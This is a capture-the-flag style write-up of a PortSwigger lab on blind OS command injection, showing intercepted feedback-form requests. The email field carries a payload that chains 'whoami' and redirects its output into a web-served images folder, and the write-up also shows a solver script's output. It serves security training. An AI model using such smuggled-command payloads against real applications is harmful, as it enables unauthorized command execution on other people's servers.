# Lab: Blind OS command injection with output redirection

### Instructions

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
`/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output. 

### Solution

Intercepting a test POST request in the feedback we have the following parameters to test:

```
POST /feedback/submit HTTP/1.1
Host: 0a8000430431100982686a1700ae00aa.web-security-academy.net
Cookie: session=aRowNFQ8PJN2pKgQK9cw3kZHUVeNSPsa
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: https://0a8000430431100982686a1700ae00aa.web-security-academy.net
Referer: https://0a8000430431100982686a1700ae00aa.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

csrf=8sJrjheeRNO9u33oDSGgZrLaDvmQKhY0&name=test&email=test%40test.com&subject=test&message=test
```

We can see in the page source images are stored at `/image?filename=<filename>`

```html
<img src="/image?filename=3.jpg">
<h3>Balance Beams</h3>
```

Beginning to test for injection with output redirect, we find command injection in the `email` parameter:

```
POST /feedback/submit HTTP/2
Host: 0a8000430431100982686a1700ae00aa.web-security-academy.net
Cookie: session=aRowNFQ8PJN2pKgQK9cw3kZHUVeNSPsa
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Origin: https://0a8000430431100982686a1700ae00aa.web-security-academy.net
Referer: https://0a8000430431100982686a1700ae00aa.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=8sJrjheeRNO9u33oDSGgZrLaDvmQKhY0&name=test&email=test%40test.com+||+whoami+>+/var/www/images/whoami.txt+||+&subject=test&message=test
```

We can then access the output of the `whoami` command at:

```
https://0a8000430431100982686a1700ae00aa.web-security-academy.net/image?filename=whoami.txt
```

`peter-dm6amN`

Which solves the lab.

### Python Solution

See `cmdi_03.py`.
```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Command_Injection/CMDi_03_blind_os_command_injection_with_output_redirection]
└─$ python cmdi_03.py https://0a0c003c04e8bdfa819a5c9200db0058.web-security-academy.net/
[*] Attempting command injection
[+] Command injection successful: whoami: peter-spMRQx
[+] Lab solved.
```